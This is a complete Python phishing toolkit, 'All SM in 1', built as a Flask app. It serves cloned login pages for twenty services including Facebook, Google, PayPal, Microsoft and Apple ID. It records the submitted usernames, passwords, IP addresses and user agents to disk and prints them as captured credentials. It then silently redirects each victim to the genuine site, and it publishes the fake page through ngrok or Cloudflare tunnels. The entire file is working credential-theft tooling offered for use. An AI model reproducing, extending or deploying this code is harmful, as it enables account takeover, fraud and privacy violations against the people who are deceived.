#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════
#    ▄▀█ █░░ █░░   █▀ █▀▄▀█   █ █▄░█   ▀█
#    █▀█ █▄▄ █▄▄   ▄█ █░▀░█   █ █░▀█   █▄
#
#    All SM in 1  —  Multi-Platform Phishing Toolkit
#    Author  : Asghar
#    Version : 2.0
# ═══════════════════════════════════════════════════════════════

import os, sys, json, time, threading, subprocess, shutil, argparse, random, socket, re, itertools
from datetime import datetime
from flask import Flask, request, render_template_string

# ─── ANSI colors ───
class C:
    R="\033[0m"; B="\033[1m"; D="\033[2m"
    RED="\033[91m"; GRN="\033[92m"; YEL="\033[93m"; BLU="\033[94m"
    MAG="\033[95m"; CYN="\033[96m"; WHT="\033[97m"
    BG_BLK="\033[40m"; BG_BLU="\033[44m"; BG_MAG="\033[45m"

def c(text, color): return f"{color}{text}{C.R}"

def clear(): os.system("clear" if os.name != "nt" else "cls")

def box(lines, color=C.CYN, pad=2):
    w = max(len(_strip(l)) for l in lines) + pad*2
    top = "╔" + "═"*w + "╗"
    bot = "╚" + "═"*w + "╝"
    out = [c(top, color)]
    for l in lines:
        vis = _strip(l)
        sp = w - len(vis) - pad
        out.append(c("║", color) + " "*pad + l + " "*sp + c("║", color))
    out.append(c(bot, color))
    return "\n".join(out)

def _strip(s):
    return re.sub(r"\033\[[0-9;]*m", "", s)

def spin(msg, stop_event, color=C.YEL):
    frames = itertools.cycle(["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"])
    while not stop_event.is_set():
        sys.stdout.write(f"\r  {c(next(frames), color)} {msg}   ")
        sys.stdout.flush()
        time.sleep(0.08)
    sys.stdout.write("\r" + " "*70 + "\r")

# ─── Flask ───
APP = Flask(__name__)
ROOT     = os.path.dirname(os.path.abspath(__file__))
AUTH_DIR = os.path.join(ROOT, "auth")
os.makedirs(AUTH_DIR, exist_ok=True)
LOCK             = threading.Lock()
CURRENT_PLATFORM = {"key": "1"}
PUBLIC_URL       = {"url": ""}

PLATFORMS = {
    "1":{"name":"Facebook","color":"#1877f2","bg":"#f0f2f5","text":"#1c1e21","btn":"#1877f2","f1":"Email or Phone","f2":"Password","logo":"f"},
    "2":{"name":"Instagram","color":"#E4405F","bg":"#fafafa","text":"#262626","btn":"#0095f6","f1":"Username, email or phone","f2":"Password","logo":"IG"},
    "3":{"name":"WhatsApp","color":"#25D366","bg":"#111b21","text":"#e9edef","btn":"#00a884","f1":"Phone number","f2":"Password","logo":"WA"},
    "4":{"name":"TikTok","color":"#FE2C55","bg":"#000000","text":"#ffffff","btn":"#FE2C55","f1":"Email or username","f2":"Password","logo":"TT"},
    "5":{"name":"Twitter / X","color":"#1DA1F2","bg":"#000000","text":"#ffffff","btn":"#1DA1F2","f1":"Phone, email, or username","f2":"Password","logo":"X"},
    "6":{"name":"Snapchat","color":"#FFFC00","bg":"#FFFC00","text":"#000000","btn":"#00b0ff","f1":"Username or Email","f2":"Password","logo":"SC"},
    "7":{"name":"LinkedIn","color":"#0A66C2","bg":"#f3f2ef","text":"#000000","btn":"#0A66C2","f1":"Email or Phone","f2":"Password","logo":"in"},
    "8":{"name":"Google","color":"#4285F4","bg":"#ffffff","text":"#202124","btn":"#1a73e8","f1":"Email or phone","f2":"Password","logo":"G"},
    "9":{"name":"Netflix","color":"#E50914","bg":"#000000","text":"#ffffff","btn":"#E50914","f1":"Email or phone number","f2":"Password","logo":"N"},
    "10":{"name":"Spotify","color":"#1DB954","bg":"#121212","text":"#ffffff","btn":"#1DB954","f1":"Email or username","f2":"Password","logo":"SP"},
    "11":{"name":"Telegram","color":"#0088cc","bg":"#ffffff","text":"#000000","btn":"#0088cc","f1":"Phone number","f2":"Password","logo":"TG"},
    "12":{"name":"Discord","color":"#5865F2","bg":"#36393f","text":"#ffffff","btn":"#5865F2","f1":"Email or Phone","f2":"Password","logo":"DC"},
    "13":{"name":"Reddit","color":"#FF4500","bg":"#ffffff","text":"#1a1a1b","btn":"#FF4500","f1":"Username","f2":"Password","logo":"RD"},
    "14":{"name":"Pinterest","color":"#E60023","bg":"#ffffff","text":"#111111","btn":"#E60023","f1":"Email","f2":"Password","logo":"PT"},
    "15":{"name":"GitHub","color":"#24292e","bg":"#0d1117","text":"#c9d1d9","btn":"#238636","f1":"Username or email","f2":"Password","logo":"GH"},
    "16":{"name":"Microsoft","color":"#0078D4","bg":"#ffffff","text":"#1b1b1b","btn":"#0067b8","f1":"Email, phone, or Skype","f2":"Password","logo":"MS"},
    "17":{"name":"Apple ID","color":"#000000","bg":"#f5f5f7","text":"#1d1d1f","btn":"#0071e3","f1":"Apple ID","f2":"Password","logo":"&#63743;"},
    "18":{"name":"Steam","color":"#171a21","bg":"#1b2838","text":"#c7d5e0","btn":"#66c0f4","f1":"Steam account name","f2":"Password","logo":"ST"},
    "19":{"name":"PayPal","color":"#003087","bg":"#ffffff","text":"#001c64","btn":"#0070ba","f1":"Email or mobile number","f2":"Password","logo":"PP"},
    "20":{"name":"Amazon","color":"#FF9900","bg":"#ffffff","text":"#111111","btn":"#f0c14b","f1":"Email or mobile phone number","f2":"Password","logo":"AZ"},
}

PAGE = """
<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>{{ name }} — Log in</title>
<style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{background:{{ bg }};color:{{ text }};font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px}
 .logo{width:64px;height:64px;border-radius:14px;background:{{ color }};color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:26px;margin-bottom:18px}
 .card{width:100%;max-width:390px;background:{% if dark %}rgba(255,255,255,.05){% else %}#fff{% endif %};border-radius:12px;padding:32px 26px;box-shadow:0 2px 12px rgba(0,0,0,.08);border:1px solid {% if dark %}rgba(255,255,255,.08){% else %}#e5e7eb{% endif %}}
 h1{font-size:22px;font-weight:700;margin-bottom:6px;text-align:center}
 p.sub{font-size:13px;opacity:.72;text-align:center;margin-bottom:22px}
 input{width:100%;padding:13px 14px;font-size:15px;border-radius:8px;border:1px solid {% if dark %}rgba(255,255,255,.16){% else %}#d1d5db{% endif %};background:{% if dark %}rgba(255,255,255,.04){% else %}#fff{% endif %};color:{{ text }};margin-bottom:11px;outline:none;font-family:inherit}
 input:focus{border-color:{{ color }}}
 button{width:100%;padding:13px;font-size:15px;font-weight:600;color:#fff;background:{{ btn }};border:none;border-radius:8px;cursor:pointer;margin-top:6px;font-family:inherit}
 .row{display:flex;justify-content:space-between;font-size:12px;opacity:.7;margin-top:14px}
 a{color:{{ color }};text-decoration:none}
</style></head><body>
 <div class="logo">{{ logo }}</div>
 <div class="card">
   <h1>Log in to {{ name }}</h1>
   <p class="sub">Continue to your {{ name }} account</p>
   <form method="POST" action="/submit">
     <input type="text" name="username" placeholder="{{ f1 }}" required autofocus/>
     <input type="password" name="password" placeholder="{{ f2 }}" required/>
     <button type="submit">Log In</button>
     <div class="row"><a href="#">Forgot password?</a><a href="#">Sign up</a></div>
   </form>
 </div>
</body></html>"""

SUCCESS = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>{{ name }}</title>
<style>body{background:{{ bg }};color:{{ text }};font-family:-apple-system,Segoe UI,Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;text-align:center}
h1{font-size:20px;margin:0 0 8px}p{opacity:.7;font-size:14px}</style></head>
<body><div><h1>Redirecting…</h1><p>Please wait…</p></div>
<script>setTimeout(function(){location.href="{{ real }}";},1500);</script></body></html>"""

REAL_URLS = {
    "Facebook":"https://www.facebook.com/login","Instagram":"https://www.instagram.com/accounts/login/",
    "WhatsApp":"https://web.whatsapp.com/","TikTok":"https://www.tiktok.com/login",
    "Twitter / X":"https://twitter.com/i/flow/login","Snapchat":"https://accounts.snapchat.com/accounts/login",
    "LinkedIn":"https://www.linkedin.com/login","Google":"https://accounts.google.com/signin",
    "Netflix":"https://www.netflix.com/login","Spotify":"https://accounts.spotify.com/login",
    "Telegram":"https://web.telegram.org/","Discord":"https://discord.com/login",
    "Reddit":"https://www.reddit.com/login/","Pinterest":"https://www.pinterest.com/login/",
    "GitHub":"https://github.com/login","Microsoft":"https://login.live.com/",
    "Apple ID":"https://appleid.apple.com/sign-in","Steam":"https://store.steampowered.com/login/",
    "PayPal":"https://www.paypal.com/signin","Amazon":"https://www.amazon.com/ap/signin",
}
DARK_BGS = {"#000000","#111b21","#0d1117","#36393f","#1b2838","#121212"}

@APP.route("/")
def index():
    key = CURRENT_PLATFORM["key"]; p = PLATFORMS[key]
    ip = _ip(); _log(ip, key, "visit", {})
    print(c("  ┌─", C.GRN) + c(f" VISIT ", C.BG_BLK+C.WHT) + c(f" {ip}  →  {p['name']} ", C.CYN) + c("─", C.GRN))
    return render_template_string(PAGE,
        name=p["name"], color=p["color"], bg=p["bg"], text=p["text"],
        btn=p["btn"], f1=p["f1"], f2=p["f2"], logo=p["logo"], dark=p["bg"] in DARK_BGS)

@APP.route("/submit", methods=["POST"])
def submit():
    key = CURRENT_PLATFORM["key"]; p = PLATFORMS[key]; ip = _ip()
    u = request.form.get("username",""); pw = request.form.get("password","")
    ua = request.headers.get("User-Agent","")
    _save(ip, p["name"], u, pw, ua)
    lines = [
        c("  🎯  CREDENTIALS CAPTURED", C.BG_BLK+C.B+"\033[92m"),
        "",
        f"  {c('Platform', C.CYN)} : {c(p['name'], C.B)}",
        f"  {c('IP      ', C.CYN)} : {ip}",
        f"  {c('Time    ', C.CYN)} : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"  {c('Username', C.CYN)} : {c(u, C.YEL+C.B)}",
        f"  {c('Password', C.CYN)} : {c(pw, C.RED+C.B)}",
        f"  {c('Agent   ', C.CYN)} : {ua[:60]}",
        "",
        c("  All SM in 1  —  by Asghar", C.D),
    ]
    print()
    print(box(lines, C.GRN))
    print()
    return render_template_string(SUCCESS, name=p["name"], bg=p["bg"], text=p["text"],
        real=REAL_URLS.get(p["name"],"https://www.google.com"))

def _ip():
    xff=request.headers.get("X-Forwarded-For","")
    return xff.split(",")[0].strip() if xff else (request.remote_addr or "unknown")

def _save(ip, platform, user, pw, ua):
    day = datetime.utcnow().strftime("%Y-%m-%d")
    d = os.path.join(AUTH_DIR, day); os.makedirs(d, exist_ok=True)
    fn = os.path.join(d, f"{platform.replace('/','_')}_{int(time.time())}.txt")
    with LOCK:
        with open(fn,"a",encoding="utf-8") as f:
            f.write("═"*60+"\n")
            f.write("  All SM in 1  —  Tool by Asghar\n")
            f.write("═"*60+"\n")
            f.write(f"Platform  : {platform}\n")
            f.write(f"Time      : {datetime.utcnow().isoformat()}Z\n")
            f.write(f"IP        : {ip}\n")
            f.write(f"UserAgent : {ua}\n")
            f.write(f"Username  : {user}\n")
            f.write(f"Password  : {pw}\n")
            f.write("═"*60+"\n\n")

def _log(ip, platform, kind, payload):
    day = datetime.utcnow().strftime("%Y-%m-%d")
    d = os.path.join(AUTH_DIR, day); os.makedirs(d, exist_ok=True)
    with LOCK:
        with open(os.path.join(d,"events.jsonl"),"a",encoding="utf-8") as f:
            f.write(json.dumps({"ts":datetime.utcnow().isoformat()+"Z",
                "tool":"All SM in 1 by Asghar","ip":ip,"platform":platform,
                "kind":kind,"ua":request.headers.get("User-Agent",""),"data":payload})+"\n")

# ─── tunnel ───
def _port_open(port):
    s = socket.socket(); s.settimeout(0.5)
    try: return s.connect_ex(("127.0.0.1", port)) == 0
    finally: s.close()

def _read_url(proc, patterns, timeout=25):
    end = time.time() + timeout
    for line in iter(proc.stdout.readline, ""):
        if time.time() > end: break
        for pat in patterns:
            m = re.search(pat, line)
            if m: return m.group(1)
    return None

def tunnel_ngrok(port):
    if not shutil.which("ngrok"): return None, None
    proc = subprocess.Popen(["ngrok","http",str(port),"--log=stdout"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    url = _read_url(proc, [r"url=(https://[^\s]+)"], timeout=15)
    if not url:
        try:
            import urllib.request
            time.sleep(2)
            r = urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels", timeout=3)
            for t in json.loads(r.read()).get("tunnels", []):
                if t.get("public_url","").startswith("https://"):
                    return t["public_url"], proc
        except Exception: pass
    return url, proc

def tunnel_cloudflared(port, named=None):
    if not shutil.which("cloudflared"): return None, None
    if named:
        cmd = ["cloudflared","tunnel","--url",f"http://localhost:{port}",
               "--hostname", named, "--no-autoupdate"]
    else:
        cmd = ["cloudflared","tunnel","--url",f"http://localhost:{port}","--no-autoupdate"]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True, bufsize=1)
    pats = [r"(https://[a-z0-9\-]+\.trycloudflare\.com)"]
    if named: pats.insert(0, r"(https://" + re.escape(named) + ")")
    url = _read_url(proc, pats, timeout=25)
    return url, proc

def start_tunnel(port, named=None):
    # wait for local server
    for _ in range(40):
        if _port_open(port): break
        time.sleep(0.25)
    stop = threading.Event()
    t = threading.Thread(target=spin, args=("opening public tunnel…", stop), daemon=True)
    t.start()

    url = None; proc = None
    for name, fn in [("ngrok", lambda p: tunnel_ngrok(p)),
                     ("cloudflared", lambda p: tunnel_cloudflared(p, named))]:
        try:
            u, pr = fn(port)
            if u: url, proc = u, pr; break
        except Exception: pass
    stop.set(); time.sleep(0.15)

    if url:
        PUBLIC_URL["url"] = url
        print(c("  ✔ tunnel established", C.GRN + C.B))
        print()
        lines = [
            c("  🌐  PUBLIC LINK", C.B + C.WHT),
            "",
            f"  {c(url, C.CYN + C.B)}",
            "",
            f"  {c('All SM in 1', C.MAG)}  —  {c('by Asghar', C.D)}",
        ]
        print(box(lines, C.MAG))
        print()
    else:
        print(c("  ✘ tunnel failed", C.RED + C.B))
        print(c(f"    manual:  cloudflared tunnel --url http://localhost:{port}", C.D))

# ─── UI ───
LOGO = r"""
   ▄▀█ █░░ █░░   █▀ █▀▄▀█   █ █▄░█   ▀█
   █▀█ █▄▄ █▄▄   ▄█ █░▀░█   █ █░▀█   █▄
"""

def banner():
    clear()
    print(c(LOGO, C.MAG + C.B))
    print(c("   All SM in 1  ·  Multi-Platform Phishing Toolkit", C.CYN))
    print(c("   Author: Asghar   |   Version 2.0", C.D))
    print(c("  " + "─"*58, C.D))
    print()

def menu():
    banner()
    items = []
    keys = sorted(PLATFORMS.keys(), key=lambda x:int(x))
    for i in range(0, len(keys), 2):
        l = f"  {c('['+keys[i].rjust(2)+']', C.YEL)} {PLATFORMS[keys[i]]['name']:<15}"
        r = f"  {c('['+keys[i+1].rjust(2)+']', C.YEL)} {PLATFORMS[keys[i+1]]['name']:<15}" if i+1<len(keys) else ""
        items.append(l + r)
    items.append("")
    items.append(f"  {c('[ 0]', C.RED)} Exit")
    print(box(items, C.CYN))
    print()

def main():
    ap = argparse.ArgumentParser(description="All SM in 1 — by Asghar")
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--platform")
    ap.add_argument("--hostname", help="custom domain (needs cloudflared named tunnel)")
    ap.add_argument("--no-tunnel", action="store_true")
    a = ap.parse_args()

    if a.platform and a.platform in PLATFORMS:
        CURRENT_PLATFORM["key"] = a.platform
    else:
        menu()
        try: ch = input(c("  └─❯ ", C.MAG+C.B)).strip()
        except (EOFError,KeyboardInterrupt): print(); sys.exit(0)
        if ch in ("0",""): print(c("  bye.", C.D)); sys.exit(0)
        if ch not in PLATFORMS: print(c("  ✘ invalid choice", C.RED)); sys.exit(1)
        CURRENT_PLATFORM["key"] = ch

    p = PLATFORMS[CURRENT_PLATFORM["key"]]
    banner()
    lines = [
        f"  {c('platform', C.CYN)} : {c(p['name'], C.B)}",
        f"  {c('local  ', C.CYN)} : {c(f'http://127.0.0.1:{a.port}/', C.D)}",
        f"  {c('auth   ', C.CYN)} : {c(AUTH_DIR, C.D)}",
        f"  {c('author ', C.CYN)} : {c('Asghar', C.MAG+C.B)}",
    ]
    print(box(lines, C.GRN))
    print()

    if not a.no_tunnel:
        threading.Thread(target=start_tunnel, args=(a.port, a.hostname), daemon=True).start()

    import logging
    logging.getLogger('werkzeug').setLevel(logging.ERROR)
    APP.run(host="0.0.0.0", port=a.port, debug=False, threaded=True, use_reloader=False)

if __name__ == "__main__":
    main()
